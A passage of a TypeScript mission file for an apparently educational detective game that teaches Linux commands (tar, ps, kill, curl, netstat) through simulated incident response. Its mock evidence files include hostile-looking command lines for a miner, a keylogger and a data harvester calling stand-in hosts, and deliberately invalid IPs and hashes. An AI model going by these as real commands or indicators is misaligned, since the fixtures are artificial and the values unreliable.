				"case_summary_template.txt": {
					content: `CASE SUMMARY TEMPLATE
====================
Case Number: [TO BE FILLED]
Date Opened: [DATE]
Investigating Officer: [NAME]
Case Type: [CYBERCRIME/FRAUD/ETC]

INCIDENT OVERVIEW:
[Brief description of the incident]

KEY EVIDENCE:
1. [Evidence item 1]
2. [Evidence item 2]
3. [Evidence item 3]

WITNESSES:
- [Witness names and roles]

TIMELINE:
[Key events in chronological order]

STATUS: [OPEN/CLOSED/PENDING]

NEXT STEPS:
[Actions required to advance investigation]`,
				},
			},
		}),
		allowedCommands: ["ls", "cd", "pwd", "cat", "mkdir", "cp", "mv", "help"],
		newCommands: ["mkdir", "cp", "mv"],
		unlocked: false,
		completed: false,
		successMessage: [
			"Outstanding Case Organization!",
			"",
			"You've mastered directory management commands:",
			"• mkdir - Create directories and subdirectories",
			"• cp - Copy files while preserving originals",
			"• mv - Move and rename files and directories",
			"",
			"Your professional case organization includes:",
			"- Structured directory hierarchy for Case 2024-004",
			"- Primary evidence properly catalogued and renamed",
			"- Specialized subdirectories for witnesses, forensics, and timeline",
			"- Witness statements organized in appropriate location",
			"",
			"This organization will be invaluable for court proceedings.",
			"",
			"Skills Acquired: mkdir, cp, mv, professional case management",
			'Next mission unlocked: "The Archive Explorer"',
		],
	},

	{
		id: "mission_07",
		title: "The Archive Explorer",
		difficulty: 1,
		description:
			"Investigate compressed archives that may contain hidden evidence or malicious content.",
		briefing: {
			story: [
				"Detective, we've intercepted suspicious archive files.",
				"",
				"Criminals often hide evidence in compressed archives to avoid detection.",
				"These files require special techniques to examine safely.",
				"Master archive handling to uncover what's hidden inside.",
			],
			task: "Learn to safely extract and examine compressed archive files.",
			instructions: [
				"Master tar command for handling .tar archives.",
				"Learn gzip/gunzip for .gz file compression.",
				"Practice safe extraction techniques for investigation.",
			],
		},
		objectives: [
			{
				id: "list_archive_contents",
				description:
					"List the contents of suspicious_archive.tar without extracting",
				hint: 'Use "tar -tf suspicious_archive.tar" to list contents safely',
				completed: false,
				requiredCommand: "tar",
				validator: {
					type: "args-output",
					fn: (args: string, output: string) => {
						return (
							args.includes("-tf") &&
							args.includes("suspicious_archive.tar") &&
							output.includes("hidden_data.txt")
						);
					},
				},
			},
			{
				id: "extract_archive",
				description: "Extract the archive contents to examine the files",
				hint: 'Use "tar -xf suspicious_archive.tar" to extract the files',
				completed: false,
				requiredCommand: "tar",
				validator: {
					type: "args-output",
					fn: (args: string, _output: string) => {
						return (
							args.includes("-xf") && args.includes("suspicious_archive.tar")
						);
					},
				},
			},
			{
				id: "decompress_gzip",
				description: "Decompress the encrypted_data.gz file",
				hint: 'Use "gunzip encrypted_data.gz" to decompress the file',
				completed: false,
				requiredCommand: "gunzip",
				validator: {
					type: "args-output",
					fn: (args: string, _output: string) => {
						return args.includes("encrypted_data.gz");
					},
				},
			},
			{
				id: "create_evidence_archive",
				description: "Create a new archive with all extracted evidence files",
				hint: 'Use "tar -cf evidence_collection.tar hidden_data.txt encrypted_data financial_records/"',
				completed: false,
				requiredCommand: "tar",
				validator: {
					type: "args-output",
					fn: (args: string, _output: string) => {
						return (
							args.includes("-cf") &&
							args.includes("evidence_collection.tar") &&
							args.includes("hidden_data.txt")
						);
					},
				},
			},
			{
				id: "compress_evidence",
				description: "Compress the evidence archive to save storage space",
				hint: 'Use "gzip evidence_collection.tar" to compress the archive',
				completed: false,
				requiredCommand: "gzip",
				validator: {
					type: "args-output",
					fn: (args: string, _output: string) => {
						return args.includes("evidence_collection.tar");
					},
				},
			},
		],
		filesystem: createFilesystem({
			"suspicious_archive.tar": {
				content: "TAR_ARCHIVE_PLACEHOLDER",
				files: {
					"hidden_data.txt": {
						content: `HIDDEN DATA DISCOVERY
====================
Date: January 17, 2024

This file was concealed inside an archive to avoid detection.
Contents reveal criminal conspiracy involving data theft.

PARTICIPANTS:
- User ID: admin_shadow
- Access Code: 7h3_1ns1d3r
- Target: Financial database systems

PLAN:
Phase 1: Gain administrative access (COMPLETE)
Phase 2: Extract sensitive financial data (IN PROGRESS)  
Phase 3: Sell data to foreign competitors (PLANNED)

EVIDENCE:
This file proves premeditated intent to commit corporate espionage.
Archive creation date matches initial breach timeline.`,
					},
					financial_records: {
						"stolen_data_manifest.txt": {
							content: `STOLEN DATA MANIFEST
===================
Theft Operation: "Golden Vault"
Date Range: January 10-16, 2024

FILES SUCCESSFULLY EXTRACTED:
1. customer_database.sql (2.3 GB)
2. financial_reports_2023.xlsx (45 MB)
3. salary_information.csv (12 MB)
4. bank_account_details.txt (8 MB)
5. credit_card_processing.log (156 MB)

TOTAL DATA STOLEN: 2.52 GB
ESTIMATED VALUE: $2.4 Million USD

BUYER IDENTIFIED: 
Contact: foreign_competitor@darkweb.onion
Payment: 50 Bitcoin (transferred)
Delivery: Secure FTP server (coordinates attached)

This manifest provides complete evidence of the data theft operation.`,
						},
					},
				},
			},
			"encrypted_data.gz": {
				content: `ENCRYPTED COMMUNICATION LOG
==========================
[AFTER DECOMPRESSION]

SECRET COMMUNICATIONS BETWEEN CONSPIRATORS:

Message 1:
From: insider@company.com
To: handler@criminal.org
Date: January 12, 2024
Subject: Access Confirmed

"I'm in. Admin privileges obtained using social engineering.
Financial systems are wide open. Beginning data extraction tonight.
Payment better be ready as promised."

Message 2:  
From: handler@criminal.org
To: insider@company.com
Date: January 13, 2024
Subject: Re: Access Confirmed

"Excellent work. Bitcoin wallet ready for transfer.
Focus on customer data and financial reports - highest value.
Clean up traces when finished."

Message 3:
From: insider@company.com  
To: handler@criminal.org
Date: January 16, 2024
Subject: Mission Complete

"Data extracted successfully. 2.5GB of premium intel.
Uploading to dead drop location now.
Wire the payment and I disappear forever."

These messages prove coordination between internal and external threats.`,
			},
			archive_tools: {
				"compression_guide.txt": {
					content: `DIGITAL FORENSICS - ARCHIVE HANDLING
===================================

Common Archive Types in Investigations:
- .tar - Tape Archive (uncompressed)
- .tar.gz / .tgz - Compressed tar archive
- .zip - ZIP compressed archive
- .gz - GNU zip compression

Safe Examination Commands:
tar -tf archive.tar          # List contents without extracting
tar -xf archive.tar          # Extract files safely
gunzip file.gz               # Decompress gzip files
gzip file                    # Compress files

SECURITY CONSIDERATIONS:
- Always list archive contents first
- Extract in isolated directory
- Check for path traversal attacks (../ in filenames)
- Scan extracted files for malware
- Maintain chain of custody documentation

Evidence Preservation:
- Create compressed archives of collected evidence
- Use consistent naming conventions
- Document extraction process
- Verify archive integrity with checksums`,
				},
			},
		}),
		allowedCommands: [
			"ls",
			"cd",
			"pwd",
			"cat",
			"tar",
			"gzip",
			"gunzip",
			"help",
		],
		newCommands: ["tar", "gzip", "gunzip"],
		unlocked: false,
		completed: false,
		successMessage: [
			"Exceptional Archive Investigation!",
			"",
			"You've mastered archive handling commands:",
			"• tar -tf - List archive contents safely before extraction",
			"• tar -xf - Extract archive files for examination",
			"• tar -cf - Create new archives from evidence files",
			"• gunzip - Decompress .gz files",
			"• gzip - Compress files for storage",
			"",
			"Major case breakthrough achieved:",
			"- Discovered hidden criminal conspiracy in archived data",
			"- Uncovered complete data theft operation 'Golden Vault'",
			"- Found encrypted communications proving internal/external coordination",
			"- Documented $2.4M data theft with Bitcoin payment trail",
			"",
			"This evidence will be crucial for prosecution.",
			"",
			"Skills Acquired: tar, gzip, gunzip, archive forensics",
			'Next mission unlocked: "The System Inspector"',
		],
	},

	{
		id: "mission_08",
		title: "The System Inspector",
		difficulty: 1,
		description:
			"Learn system monitoring commands to investigate suspicious system activity and resource usage.",
		briefing: {
			story: [
				"Detective, our systems are acting strangely.",
				"",
				"CPU usage is spiking, memory is being consumed rapidly, and processes are behaving oddly.",
				"This could indicate malware, cryptocurrency mining, or other malicious activity.",
				"We need system monitoring skills to investigate what's happening.",
			],
			task: "Master system monitoring commands to investigate suspicious system behavior.",
			instructions: [
				"Learn ps to examine running processes and identify suspicious activity.",
				"Master top to monitor real-time system performance.",
				"Use df and du to investigate disk space usage anomalies.",
			],
		},
		objectives: [
			{
				id: "list_processes",
				description:
					"List all running processes to identify suspicious activity",
				hint: 'Use "ps aux" to see all processes with detailed information',
				completed: false,
				requiredCommand: "ps",
				validator: {
					type: "args-output",
					fn: (args: string, output: string) => {
						return (
							args.includes("aux") &&
							output.includes("crypto_miner") &&
							output.includes("data_harvester")
						);
					},
				},
			},
			{
				id: "monitor_resources",
				description:
					"Check real-time system performance to see resource consumption",
				hint: 'Use "top" to see live process and resource monitoring (press q to quit)',
				completed: false,
				requiredCommand: "top",
				validator: {
					type: "output",
					fn: (output: string) => {
						return (
							output.includes("CPU usage") && output.includes("Memory usage")
						);
					},
				},
			},
			{
				id: "check_disk_space",
				description: "Check disk space usage across all mounted filesystems",
				hint: 'Use "df -h" to see disk space in human-readable format',
				completed: false,
				requiredCommand: "df",
				validator: {
					type: "args-output",
					fn: (args: string, output: string) => {
						return (
							args.includes("-h") &&
							output.includes("85%") &&
							output.includes("CRITICAL")
						);
					},
				},
			},
			{
				id: "find_large_files",
				description: "Find which directories are consuming the most disk space",
				hint: 'Use "du -sh *" to see directory sizes in the current location',
				completed: false,
				requiredCommand: "du",
				validator: {
					type: "args-output",
					fn: (args: string, output: string) => {
						return (
							args.includes("-sh") &&
							output.includes("15G") &&
							output.includes("suspicious_data")
						);
					},
				},
			},
			{
				id: "investigate_process",
				description: "Get detailed information about the crypto_miner process",
				hint: 'Use "ps aux | grep crypto_miner" to filter for specific process',
				completed: false,
				requiredCommand: "ps",
				validator: {
					type: "args-output",
					fn: (args: string, output: string) => {
						return (
							args.includes("grep") &&
							args.includes("crypto_miner") &&
							output.includes("95.2%")
						);
					},
				},
			},
		],
		filesystem: createFilesystem({
			system_analysis: {
				"process_report.txt": {
					content: `SYSTEM PROCESS ANALYSIS REPORT
==============================
Date: January 18, 2024
Analyst: Detective System

SUSPICIOUS PROCESSES DETECTED:

1. crypto_miner (PID: 1337)
   - CPU Usage: 95.2% (CRITICAL)
   - Memory Usage: 2.1 GB
   - Runtime: 72 hours continuous
   - Command: ./crypto_miner --pool=malicious.pool.com
   - Classification: MALWARE

2. data_harvester (PID: 2456) 
   - CPU Usage: 15.8%
   - Memory Usage: 512 MB
   - Network Activity: High outbound traffic
   - Command: python3 harvest_data.py --target=/sensitive/
   - Classification: DATA THEFT TOOL

3. keylogger_daemon (PID: 3789)
   - CPU Usage: 2.1%
   - Memory Usage: 64 MB  
   - Hidden Process: Running as system service
   - Command: /usr/bin/.hidden/keylog --output=/tmp/.keys
   - Classification: SPYWARE

RECOMMENDATION: Immediate termination of all suspicious processes required.`,
				},
				"resource_usage.txt": {
					content: `SYSTEM RESOURCE USAGE ANALYSIS
==============================

CPU USAGE BREAKDOWN:
- crypto_miner: 95.2% (Abnormal - likely cryptocurrency mining)
- data_harvester: 15.8% (High for background process)
- system processes: 8.4% (Normal)
- Available: -19.4% (System overloaded!)

MEMORY USAGE:
- Total RAM: 8 GB
- Used: 7.2 GB (90% utilization)
- crypto_miner: 2.1 GB (26% of total RAM)
- data_harvester: 512 MB (6% of total RAM)
- System critical: Only 800 MB available

DISK SPACE CRITICAL ALERT:
- Root filesystem: 85% full (CRITICAL THRESHOLD)
- /tmp directory: 15 GB of suspicious data files
- Normal system files: 45 GB
- Suspicious data: 40 GB (47% of used space)

NETWORK ACTIVITY:
- Outbound connections to unknown servers
- Data exfiltration in progress
- Cryptocurrency mining pool connections active`,
				},
			},
			suspicious_data: {
				"README.txt": {
					content: `SUSPICIOUS DATA DIRECTORY
========================
This directory contains 15 GB of data that shouldn't be here.

Contents appear to be:
- Stolen customer databases
- Copied financial records  
- Harvested employee personal information
- Cryptocurrency mining cache files

This data is consuming critical disk space and represents
evidence of multiple cybercrimes in progress.

Size breakdown:
- customer_data/: 8.2 GB
- financial_records/: 4.1 GB  
- employee_info/: 1.9 GB
- mining_cache/: 0.8 GB
TOTAL: 15.0 GB`,
				},
			},
			logs: {
				"system_performance.log": {
					content: `SYSTEM PERFORMANCE LOG - CRITICAL ALERTS
========================================

[18:45:23] ALERT: CPU usage exceeded 95% threshold
[18:45:24] WARNING: Available memory below 1GB  
[18:45:25] CRITICAL: Disk space above 85% threshold
[18:45:26] ALERT: Unusual network traffic detected
[18:45:27] WARNING: Process crypto_miner consuming excessive resources
[18:45:28] ALERT: Unauthorized data access in /sensitive/ directory
[18:45:29] CRITICAL: System performance severely degraded
[18:45:30] WARNING: Multiple malicious processes identified

AUTOMATED RESPONSE:
- Security team notified
- Process monitoring increased
- Network traffic logging enabled  
- Disk space cleanup recommended

MANUAL INTERVENTION REQUIRED:
- Terminate malicious processes
- Remove suspicious data files
- Investigate data breach scope
- Implement additional security measures`,
				},
			},
		}),
		allowedCommands: [
			"ls",
			"cd",
			"pwd",
			"cat",
			"ps",
			"top",
			"df",
			"du",
			"grep",
			"help",
		],
		newCommands: ["ps", "top", "df", "du"],
		unlocked: false,
		completed: false,
		successMessage: [
			"Outstanding System Investigation!",
			"",
			"You've mastered system monitoring commands:",
			"• ps aux - List all running processes with detailed information",
			"• top - Real-time system performance monitoring",
			"• df -h - Check disk space usage in human-readable format",
			"• du -sh - Analyze directory sizes and disk consumption",
			"",
			"Critical security threats identified:",
			"- crypto_miner process consuming 95.2% CPU (cryptocurrency mining malware)",
			"- data_harvester stealing sensitive information",
			"- keylogger_daemon recording user activity",
			"- 15 GB of stolen data consuming critical disk space",
			"",
			"System performance severely compromised. Immediate action required!",
			"",
			"Skills Acquired: ps, top, df, du, system performance analysis",
			'Next mission unlocked: "The Process Manager"',
		],
	},

	{
		id: "mission_09",
		title: "The Process Manager",
		difficulty: 1,
		description:
			"Learn to control system processes and terminate malicious activity discovered in your investigation.",
		briefing: {
			story: [
				"Detective, the system inspection revealed active threats!",
				"",
				"Malicious processes are running right now, stealing data and mining cryptocurrency.",
				"We need to stop these threats immediately before more damage is done.",
				"Time to learn process control and system cleanup techniques.",
			],
			task: "Master process management commands to stop malicious activity and secure the system.",
			instructions: [
				"Learn kill command to terminate specific malicious processes.",
				"Master killall to stop processes by name.",
				"Use which and type to investigate command locations and types.",
			],
		},
		objectives: [
			{
				id: "kill_crypto_miner",
				description: "Terminate the crypto_miner process using its PID",
				hint: 'Use "kill 1337" to terminate the crypto_miner process (PID 1337)',
				completed: false,
				requiredCommand: "kill",
				validator: {
					type: "args-output",
					fn: (args: string, output: string) => {
						return (
							args.includes("1337") &&
							output.includes("crypto_miner terminated")
						);
					},
				},
			},
			{
				id: "killall_harvesters",
				description: "Stop all data_harvester processes at once",
				hint: 'Use "killall data_harvester" to terminate all instances',
				completed: false,
				requiredCommand: "killall",
				validator: {
					type: "args-output",
					fn: (args: string, output: string) => {
						return (
							args.includes("data_harvester") &&
							output.includes("processes terminated")
						);
					},
				},
			},
			{
				id: "force_kill_keylogger",
				description: "Force terminate the stubborn keylogger_daemon process",
				hint: 'Use "kill -9 3789" to force kill the keylogger (PID 3789)',
				completed: false,
				requiredCommand: "kill",
				validator: {
					type: "args-output",
					fn: (args: string, output: string) => {
						return (
							args.includes("-9") &&
							args.includes("3789") &&
							output.includes("keylogger_daemon terminated")
						);
					},
				},
			},
			{
				id: "locate_malware",
				description: "Find the location of the crypto_miner executable",
				hint: 'Use "which crypto_miner" to find where the malware is located',
				completed: false,
				requiredCommand: "which",
				validator: {
					type: "args-output",
					fn: (args: string, output: string) => {
						return (
							args.includes("crypto_miner") &&
							output.includes("/tmp/.hidden/crypto_miner")
						);
					},
				},
			},
			{
				id: "check_command_type",
				description: "Determine what type of command 'data_harvester' is",
				hint: 'Use "type data_harvester" to see if it\'s a built-in, alias, or executable',
				completed: false,
				requiredCommand: "type",
				validator: {
					type: "args-output",
					fn: (args: string, output: string) => {
						return (
							args.includes("data_harvester") &&
							output.includes("is /tmp/.malware/data_harvester")
						);
					},
				},
			},
			{
				id: "verify_cleanup",
				description: "Verify that all malicious processes have been terminated",
				hint: "Use \"ps aux | grep -E '(crypto_miner|data_harvester|keylogger)'\" to check",
				completed: false,
				requiredCommand: "ps",
				validator: {
					type: "args-output",
					fn: (args: string, output: string) => {
						return (
							args.includes("grep") &&
							output.includes("No malicious processes found")
						);
					},
				},
			},
		],
		filesystem: createFilesystem({
			tmp: {
				".hidden": {
					crypto_miner: {
						content: `#!/bin/bash
# Cryptocurrency Mining Malware
# This malicious script mines cryptocurrency using victim's resources

echo "Initializing crypto mining operation..."
echo "Connecting to mining pool: malicious.pool.com"
echo "Using 95% CPU for maximum profit"
echo "Estimated earnings: $2.50/day"

# This file represents malware that needs to be removed
# It's hidden in /tmp/.hidden/ to avoid detection`,
					},
				},
				".malware": {
					data_harvester: {
						content: `#!/usr/bin/env python3
# Data Harvesting Tool - MALICIOUS
# Steals sensitive information from target systems

import os
import shutil

print("Data harvesting initiated...")
print("Target directories: /sensitive/, /financial/, /personal/")
print("Exfiltration server: evil-server.darkweb.com")
print("Files harvested: 15,847 documents")
print("Total data stolen: 15.2 GB")

# This represents malware that steals data
# Located in /tmp/.malware/ directory`,
					},
				},
			},
			process_management: {
				"termination_log.txt": {
					content: `PROCESS TERMINATION LOG
======================
Date: January 18, 2024
Operator: Detective Process

MALICIOUS PROCESSES IDENTIFIED:
1. crypto_miner (PID: 1337) - CPU: 95.2%
2. data_harvester (PID: 2456, 2457, 2458) - Multiple instances
3. keylogger_daemon (PID: 3789) - Hidden spyware

TERMINATION SEQUENCE:
[18:50:01] kill 1337 - crypto_miner terminated successfully
[18:50:05] killall data_harvester - 3 processes terminated  
[18:50:10] kill -9 3789 - keylogger_daemon force terminated
[18:50:15] Verification: No malicious processes found

SYSTEM IMPACT:
- CPU usage dropped from 115% to 8.4% (normal)
- Memory freed: 2.6 GB
- Network traffic reduced by 89%
- System responsiveness restored

CLEANUP ACTIONS REQUIRED:
- Remove malware executables from /tmp/.hidden/ and /tmp/.malware/
- Delete stolen data in /suspicious_data/
- Change all system passwords
- Install updated antivirus protection`,
				},
				"process_analysis.txt": {
					content: `PROCESS MANAGEMENT ANALYSIS
==========================

COMMAND REFERENCE:
kill PID           - Terminate process by Process ID
kill -9 PID        - Force terminate (SIGKILL - cannot be ignored)
killall name       - Terminate all processes with given name
which command      - Show full path to executable
type command       - Show command type (built-in, alias, file)

SIGNAL TYPES:
SIGTERM (15)       - Polite termination request (default)
SIGKILL (9)        - Force termination (cannot be caught)
SIGINT (2)         - Interrupt (Ctrl+C equivalent)
SIGSTOP (19)       - Pause process (cannot be ignored)

MALWARE LOCATIONS DISCOVERED:
/tmp/.hidden/crypto_miner       - Hidden cryptocurrency miner
/tmp/.malware/data_harvester    - Data theft tool
/usr/bin/.keylogger_daemon      - System-level spyware

SECURITY RECOMMENDATIONS:
1. Regularly monitor running processes with ps aux
2. Use kill commands to terminate suspicious processes
3. Check process locations with which/type commands
4. Remove malware files after process termination
5. Implement process monitoring alerts`,
				},
			},
			security_status: {
				"system_secured.txt": {
					content: `SYSTEM SECURITY STATUS - UPDATED
================================
Date: January 18, 2024 - 18:55:00
Status: THREATS NEUTRALIZED

ACTIONS COMPLETED:
✓ crypto_miner process terminated (PID 1337)
✓ data_harvester processes eliminated (PIDs 2456, 2457, 2458)  
✓ keylogger_daemon force killed (PID 3789)
✓ Malware locations identified and documented
✓ System performance restored to normal levels

CURRENT SYSTEM STATE:
- CPU Usage: 8.4% (NORMAL)
- Memory Usage: 2.1 GB / 8 GB (NORMAL)
- No malicious processes detected
- Network traffic normalized
- System responsiveness restored

NEXT STEPS:
1. Remove malware files from filesystem
2. Clean up stolen data directories
3. Implement continuous monitoring  
4. Update security policies
5. Train staff on threat recognition

CASE STATUS: Active threats neutralized, cleanup in progress`,
				},
			},
		}),
		allowedCommands: [
			"ls",
			"cd",
			"pwd",
			"cat",
			"ps",
			"kill",
			"killall",
			"which",
			"type",
			"grep",
			"help",
		],
		newCommands: ["kill", "killall", "which", "type"],
		unlocked: false,
		completed: false,
		successMessage: [
			"Excellent Process Management!",
			"",
			"You've mastered process control commands:",
			"• kill - Terminate processes by PID",
			"• kill -9 - Force terminate stubborn processes",
			"• killall - Terminate all processes by name",
			"• which - Locate executable file paths",
			"• type - Determine command types and locations",
			"",
			"Critical security response achieved:",
			"- Terminated crypto_miner (95.2% CPU usage eliminated)",
			"- Stopped all data_harvester instances (data theft halted)",
			"- Force-killed keylogger_daemon (spyware removed)",
			"- System performance restored to normal (8.4% CPU)",
			"",
			"Active threats neutralized! System security restored.",
			"",
			"Skills Acquired: kill, killall, which, type, incident response",
			'Next mission unlocked: "The Network Operator"',
		],
	},

	{
		id: "mission_10",
		title: "The Network Operator",
		difficulty: 1,
		description:
			"Master network diagnostic commands to investigate suspicious network activity and communications.",
		briefing: {
			story: [
				"Detective, excellent work neutralizing those processes!",
				"",
				"However, we need to investigate the network connections they were using.",
				"The malware was communicating with external servers, possibly exfiltrating data.",
				"Master network diagnostics to trace these communications and secure our network.",
			],
			task: "Learn essential network commands to investigate connections and test connectivity.",
			instructions: [
				"Master ping to test network connectivity and response times.",
				"Learn wget and curl for downloading files and testing web services.",
				"Use netstat to examine network connections and listening services.",
				"Practice nslookup for DNS resolution and domain investigation.",
			],
		},
		objectives: [
			{
				id: "test_connectivity",
				description: "Test network connectivity to a suspicious server",
				hint: 'Use "ping -c 4 malicious-server.example.com" to test connectivity',
				completed: false,
				requiredCommand: "ping",
				validator: {
					type: "args-output",
					fn: (args: string, output: string) => {
						return (
							args.includes("-c") &&
							args.includes("malicious-server") &&
							output.includes("packets transmitted")
						);
					},
				},
			},
			{
				id: "download_evidence",
				description: "Download a suspicious file for analysis using wget",
				hint: 'Use "wget http://evidence-server.local/malware_sample.txt" to download',
				completed: false,
				requiredCommand: "wget",
				validator: {
					type: "args-output",
					fn: (args: string, output: string) => {
						return (
							args.includes("malware_sample.txt") && output.includes("saved")
						);
					},
				},
			},
			{
				id: "test_api_endpoint",
				description: "Test a suspicious API endpoint using curl",
				hint: 'Use "curl http://suspicious-api.local/status" to test the endpoint',
				completed: false,
				requiredCommand: "curl",
				validator: {
					type: "args-output",
					fn: (args: string, output: string) => {
						return args.includes("suspicious-api") && output.includes("status");
					},
				},
			},
			{
				id: "check_connections",
				description: "Examine current network connections and listening ports",
				hint: 'Use "netstat -tuln" to show TCP/UDP connections and listening ports',
				completed: false,
				requiredCommand: "netstat",
				validator: {
					type: "args-output",
					fn: (args: string, output: string) => {
						return (
							args.includes("-tuln") &&
							output.includes("LISTEN") &&
							output.includes("suspicious port")
						);
					},
				},
			},
			{
				id: "dns_lookup",
				description:
					"Investigate the DNS records for malicious-server.example.com",
				hint: 'Use "nslookup malicious-server.example.com" to resolve DNS information',
				completed: false,
				requiredCommand: "nslookup",
				validator: {
					type: "args-output",
					fn: (args: string, output: string) => {
						return (
							args.includes("malicious-server") &&
							output.includes("203.0.113.666")
						);
					},
				},
			},
			{
				id: "sync_investigation",
				description:
					"Synchronize investigation files to backup server using rsync",
				hint: 'Use "rsync -av investigation_files/ backup-server:/evidence/"',
				completed: false,
				requiredCommand: "rsync",
				validator: {
					type: "args-output",
					fn: (args: string, output: string) => {
						return (
							args.includes("-av") &&
							args.includes("investigation_files") &&
							output.includes("files transferred")
						);
					},
				},
			},
		],
		filesystem: createFilesystem({
			investigation_files: {
				"network_analysis.txt": {
					content: `NETWORK TRAFFIC ANALYSIS REPORT
===============================
Date: January 18, 2024
Analyst: Detective Network

SUSPICIOUS CONNECTIONS DETECTED:

1. Outbound Connection to malicious-server.example.com
   - IP Address: 203.0.113.666
   - Port: 8080 (HTTP Alternative)
   - Protocol: TCP
   - Activity: Data exfiltration
   - Volume: 2.3 GB transferred

2. Cryptocurrency Mining Pool Connection
   - Server: crypto-pool.darkweb.com
   - IP Address: 198.51.100.444
   - Port: 4444
   - Protocol: TCP
   - Activity: Mining coordination
   - Duration: 72 hours continuous

3. Command & Control Server
   - Server: c2-server.malware.net
   - IP Address: 192.0.2.333
   - Port: 31337 (Elite/Hacker port)
   - Protocol: TCP
   - Activity: Remote commands
   - Commands: 47 malicious instructions received

NETWORK SECURITY BREACH CONFIRMED`,
				},
				"dns_investigation.txt": {
					content: `DNS INVESTIGATION RESULTS
========================

MALICIOUS DOMAINS RESOLVED:
malicious-server.example.com → 203.0.113.666
crypto-pool.darkweb.com → 198.51.100.444  
c2-server.malware.net → 192.0.2.333

IP GEOLOCATION ANALYSIS:
203.0.113.666 - Location: Eastern Europe
198.51.100.444 - Location: Unknown (VPN/Proxy)
192.0.2.333 - Location: Asia-Pacific Region

DOMAIN REGISTRATION DATA:
- All domains registered within last 30 days
- Anonymous registration through privacy services
- Payment made with cryptocurrency
- Hosting on bulletproof servers

THREAT ASSESSMENT: HIGH
These domains are specifically created for cybercriminal activity.`,
				},
			},
			network_evidence: {
				"malware_sample.txt": {
					content: `MALWARE SAMPLE ANALYSIS
======================
Downloaded from: evidence-server.local
File: malware_sample.txt
Analysis Date: January 18, 2024

SAMPLE CHARACTERISTICS:
- File Type: Shell script (bash)
- Size: 2,847 bytes
- MD5 Hash: a1b2c3d4e5f6789012345678901234567
- Creation Date: January 10, 2024

MALICIOUS BEHAVIOR:
1. Downloads additional payloads from remote servers
2. Establishes persistent backdoor access
3. Harvests system information and credentials
4. Communicates with command & control infrastructure
5. Implements anti-forensics techniques

NETWORK INDICATORS:
- Connects to malicious-server.example.com:8080
- Downloads crypto mining software
- Exfiltrates data to c2-server.malware.net
- Uses encrypted communication protocols

VERDICT: HIGHLY MALICIOUS
Immediate quarantine and analysis required.`,
				},
				"api_response.json": {
					content: `{
  "status": "active",
  "server": "suspicious-api.local",
  "timestamp": "2024-01-18T18:30:00Z",
  "connections": {
    "active": 47,
    "total_today": 1843,
    "data_transferred": "15.7 GB"
  },
  "operations": {
    "data_theft": "in_progress",
    "crypto_mining": "paused", 
    "keylogging": "active",
    "c2_commands": 12
  },
  "targets": [
    "finance_department",
    "hr_database", 
    "customer_records",
    "intellectual_property"
  ],
  "next_action": "increase_data_collection",
  "threat_level": "maximum"
}`,
				},
			},
			network_config: {
				"connection_status.txt": {
					content: `NETWORK CONNECTION STATUS
========================
Generated: January 18, 2024 - 19:00:00

LISTENING SERVICES:
TCP  22   SSH (Secure Shell) - NORMAL
TCP  80   HTTP Web Server - NORMAL  
TCP  443  HTTPS Web Server - NORMAL
TCP  3306 MySQL Database - NORMAL
TCP  31337 suspicious port - MALICIOUS (C&C Server)
TCP  8080  Unknown Service - SUSPICIOUS

ESTABLISHED CONNECTIONS:
SSH: 3 active administrative sessions
HTTP: 12 active web connections
MALICIOUS: 1 active C&C connection to 192.0.2.333:31337

NETWORK SECURITY STATUS:
- Firewall: ACTIVE (some rules bypassed)
- Intrusion Detection: TRIGGERED (47 alerts)
- VPN Connections: 2 unauthorized connections detected
- DNS Queries: 156 suspicious domain lookups

IMMEDIATE ACTION REQUIRED:
Block connections to malicious IPs and domains.`,
				},
			},
		}),
		allowedCommands: [
			"ls",
			"cd",
			"pwd",
			"cat",
			"ping",
			"wget",
			"curl",
			"netstat",
			"rsync",
			"nslookup",
			"help",
		],
		newCommands: ["ping", "wget", "curl", "netstat", "rsync", "nslookup"],
		unlocked: false,
		completed: false,
		successMessage: [
			"Network Operations Mastery Complete!",
			"",
			"You've learned essential network and remote file commands:",
			"• ping - Network connectivity testing",
			"• wget - File downloading from web servers",
			"• curl - HTTP requests and API interactions",
			"• netstat - Network connection monitoring",
			"• rsync - Directory synchronization",
			"• nslookup - DNS resolution testing",
			"",
			"These commands are fundamental for DevOps, system administration, and distributed systems management.",
			"🎉 Congratulations! You've completed all Difficulty 1 missions!",
			"",
			"Skills Acquired: ping, wget, curl, netstat, rsync, nslookup",
			'Next mission unlocked: "The Night Shift Incident" (Difficulty 2)',
		],
	},
];
